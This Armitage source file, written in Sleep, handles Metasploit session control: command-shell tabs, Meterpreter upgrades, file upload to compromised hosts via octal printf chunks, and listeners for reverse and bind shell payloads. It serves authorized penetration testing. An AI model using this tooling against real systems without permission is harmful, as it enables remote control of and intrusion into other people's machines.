#
# creates a tab for interacting with a shell...
#

import console.*; 
import armitage.*;

import java.awt.*;
import java.awt.event.*;

import javax.swing.*;
import javax.swing.event.*;
import javax.swing.table.*;

import msf.*;

global('%shells $ashell $achannel %maxq');

%handlers["execute"] = {
	this('$command $channel $pid');

	if ($0 eq "execute") {
		($channel, $pid) = $null;

		if ($2 ismatch "execute -H -c -f (.*?)") {
			($command) = matched();
		}
		else if ($2 ismatch "execute -H -f (.*?) -c") {
			($command) = matched();
		}
	}
	else if ($0 eq "update" && $2 ismatch 'Channel (\d+) created.') {
		($channel) = matched();
	}
	else if ($0 eq "update" && $2 ismatch 'Process (\d+) created.') {
		($pid) = matched();
	}
	else if ($0 eq "end" && $channel !is $null && $pid !is $null) {
		dispatchEvent(lambda({
			local('$console');

			$console = [new Console: $preferences];

			%shells[$sid][$channel] = $console;

			[[$console getInput] addActionListener: lambda({
				local('$file');

				if (-exists "command.txt") {
					warn("Dropping command, old one not sent yet");
					return;
				}
				
				local('$text');
				$text = [[$console getInput] getText];
				[[$console getInput] setText: ""];

				thread(lambda({
					local('$handle $file');
					if ($client !is $mclient) {
						$file = call($mclient, "armitage.write", $sid, "$text $+ \r\n", $channel)["file"];
					}
					else {
						$handle = openf(">command.txt");
						writeb($handle, "$text $+ \r\n");
						closef($handle);
						$file = getFileProper("command.txt");
					}
				
					m_cmd($sid, "write -f \"" . strrep($file, "\\", "/") . "\" $channel");
				}, \$channel, \$sid, \$text));
			}, \$sid, \$console, \$channel)];

			[$frame addTab: "$command $pid $+ @ $+ $sid", $console, lambda({
				m_cmd($sid, "close $channel");
				m_cmd($sid, "kill $pid");
				%shells[$sid][$channel] = $null;
			}, \$sid, \$channel, \$console, \$pid)];

			m_cmd($sid, "read $channel");
		}, \$command, \$channel, \$pid, $sid => $1));
	}
};

%handlers["write"] = {
	this('$channel $ashell');

	if ($0 eq "execute" && $2 ismatch 'write -f .*? (\d+)') {
		($channel) = matched();
		$ashell = %shells[$1][$channel];
	}
	else if ($0 eq "update" && $2 ismatch '\[\*]\ Wrote \d+ bytes to channel (\d+)\.') {
		deleteFile("command.txt");

		local('$channel $ashell');
		($channel) = matched();
		sleep(50);
		m_cmd($1, "read $channel");
	}
	else if ($0 eq "update" && $2 ismatch '\[\-\] .*?' && $ashell !is $null) {
		[$ashell append: "\n $+ $2"];
		$ashell = $null;
	}
};

%handlers["read"] = {
	if ($0 eq "update") {
		if ($2 ismatch 'Read \d+ bytes from (\d+):') {
			local('$channel');
			($channel) = matched();
			$ashell = %shells[$1][$channel];
			$achannel = $channel;
		}
	}
	else if ($0 eq "end" && $ashell !is $null) {
		local('$v $count');
		$v = split("\n", [$2 trim]);
		$count = size($v);
		shift($v);
	
		while ($v[0] eq "") {
			shift($v);
		}
		#$v = substr($v, join("\n", $v));
		[$ashell append: [$ashell getPromptText] . join("\n", $v)];
		$ashell = $null;

		# look for a prompt at the end of the text... if there isn't one,
		# then it's time to do another read.
		if (size($v) > 0 && $v[-1] !ismatch '(.*?):\\\\.*?\\>') {
			sleep(50);
			m_cmd($1, "read $achannel");
		}
	}
};

sub createShellTab {
	m_cmd($1, "execute -H -c -f cmd.exe");
}

sub createCommandTab {
	m_cmd($1, "execute -H -c -f $2");
}

sub shellPopup {
        local('$popup');
        $popup = [new JPopupMenu];
        showShellMenu($popup, \$session, \$sid);
        [$popup show: [$2 getSource], [$2 getX], [$2 getY]];
}

sub showShellMenu {
	item($1, "Interact", 'I', lambda(&createShellSessionTab, \$sid, \$session));

	if ("*Windows*" iswm sessionToOS($sid)) {
		item($1, "Meterpreter...", 'M', lambda({
			call_async($client, "session.shell_upgrade", $sid, $MY_ADDRESS, randomPort());
		}, \$sid));
	}
	else {
		item($1, "Upload...", 'U', lambda({
			local('$file $name $n');
			$file = chooseFile($title => "Select file to upload", $always => 1);
			$name = getFileName($file);

			if ($file !is $null) {
				local('$progress');
				$progress = [new ProgressMonitor: $null, "Uploading $name", "Uploading $name", 0, lof($file)];

				call($client, "session.shell_write", $sid, [Base64 encode: "rm -f $name $+ \n"]);

				thread(lambda({
					local('$handle $bytes $string $t $start $n $cancel');
					$handle = openf($file);
					$start = ticks();

					while $bytes (readb($handle, 768)) {
						yield 1;

						if ([$progress isCanceled]) {
							call($client, "session.shell_write", $sid, [Base64 encode: "rm -f $name $+ \n"]);
							closef($handle);
							return;
						}

						# convert the bytes to to octal escapes
						$string = join("", map({ 
							return "\\" . formatNumber($1, 10, 8); 
						}, unpack("B*", $bytes)));

						call($client, "session.shell_write", $sid, [Base64 encode: "`which printf` \" $+ $string $+ \" >> $+ $name $+ \n"]);

						$t += strlen($bytes);
						[$progress setProgress: $t]; 
						$n = (ticks() - $start) / 1000.0;
						if ($n > 0) {
							[$progress setNote: "Speed: " . round($t / $n) . " bytes/second"];
						}

						if (available($handle) == 0) {
							closef($handle);
							return;
						}
					}

					closef($handle);
					return;
				}, \$file, \$sid, \$progress, \$name));
			}
		}, \$sid));
	}

	separator($1);
	item($1, "Disconnect", 'D', lambda({
		call_async($client, "session.stop", $sid);
	}, \$sid));
}

sub createShellSessionTab {
	local('$console $thread');
	$console = [new Console: $preferences];
	[$console setDefaultPrompt: '$ '];
        [$console setPopupMenu: lambda(&shellPopup, \$session, \$sid)];

	if ($client !is $mclient) {
		local('%r');
		%r = call($mclient, "armitage.lock", $sid);
		if (%r["error"]) {
			showError(%r["error"]);
			return;
		}
	}

	$thread = [new ConsoleClient: $console, $client, "session.shell_read", "session.shell_write", "session.stop", $sid, 0];
        [$frame addTab: "Shell $sid", $console, lambda({ 
		if ($client !is $mclient) {
			call_async($mclient, "armitage.unlock", $sid);
		}
	}, \$sid)];
}

sub listen_for_shellz {
        local('$dialog $port $type $panel $button');
        $dialog = dialog("Create Listener", 640, 480);

        $port = [new JTextField: randomPort() + "", 6];
        $type = [new JComboBox: @("shell", "meterpreter")];

        $panel = [new JPanel];
        [$panel setLayout: [new GridLayout: 2, 1]];

        [$panel add: label_for("Port: ", 100, $port)];
        [$panel add: label_for("Type: ", 100, $type)];

        $button = [new JButton: "Start Listener"];
	[$button addActionListener: lambda({
		local('%options');
		%options["PAYLOAD"] = iff([$type getSelectedItem] eq "shell", "generic/shell_reverse_tcp", "windows/meterpreter/reverse_tcp");
		%options["LPORT"] = [$port getText];
		call($client, "module.execute", "exploit", "multi/handler", %options);
		[$dialog setVisible: 0];
	}, \$dialog, \$port, \$type)];

        [$dialog add: $panel, [BorderLayout CENTER]];
        [$dialog add: center($button), [BorderLayout SOUTH]];
        [$dialog pack];

        [$dialog setVisible: 1];
}


sub connect_for_shellz {
        local('$dialog $host $port $type $panel $button');
        $dialog = dialog("Connect", 640, 480);

	$host = [new JTextField: "127.0.0.1", 20];
        $port = [new JTextField: randomPort() + "", 6];
        $type = [new JComboBox: @("shell", "meterpreter")];

        $panel = [new JPanel];
        [$panel setLayout: [new GridLayout: 3, 1]];

	[$panel add: label_for("Host: ", 100, $host)];
        [$panel add: label_for("Port: ", 100, $port)];
        [$panel add: label_for("Type: ", 100, $type)];

        $button = [new JButton: "Connect"];
	[$button addActionListener: lambda({
		local('%options');
		%options["PAYLOAD"] = iff([$type getSelectedItem] eq "shell", "generic/shell_bind_tcp", "windows/meterpreter/bind_tcp");
		%options["LPORT"] = [$port getText];
		%options["RHOST"] = [$host getText];
		warn(%options);
		warn(call($client, "module.execute", "exploit", "multi/handler", %options));
		[$dialog setVisible: 0];
	}, \$dialog, \$port, \$type, \$host)];

        [$dialog add: $panel, [BorderLayout CENTER]];
        [$dialog add: center($button), [BorderLayout SOUTH]];
        [$dialog pack];

        [$dialog setVisible: 1];
}

